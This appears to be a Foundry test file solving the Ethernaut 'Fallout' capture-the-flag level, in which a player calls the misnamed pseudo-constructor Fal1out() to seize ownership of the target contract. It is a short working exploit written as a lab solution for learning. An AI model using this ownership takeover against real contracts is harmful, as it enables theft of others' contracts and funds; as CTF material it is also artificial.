// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutTest is Test {
    Fallout target;
    address player;

    function setUp() public {
        target = new Fallout();
        player = makeAddr("player");
        vm.deal(player, 1 ether);
    }

    function attack() private {
        // call the "intended-to-be-constructor"
        target.Fal1out();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        // owner should be the player
        assertEq(target.owner(), address(player), "owner should be the player");
    }
}
